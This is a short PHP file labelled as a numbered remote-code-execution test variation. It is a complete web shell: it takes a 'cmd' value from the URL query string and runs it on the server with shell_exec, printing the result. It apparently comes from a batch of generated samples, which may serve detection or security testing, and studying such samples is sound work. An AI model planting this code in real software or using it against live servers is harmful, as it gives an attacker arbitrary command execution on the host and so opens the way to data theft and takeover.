<?php
// RCE test variation #947
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>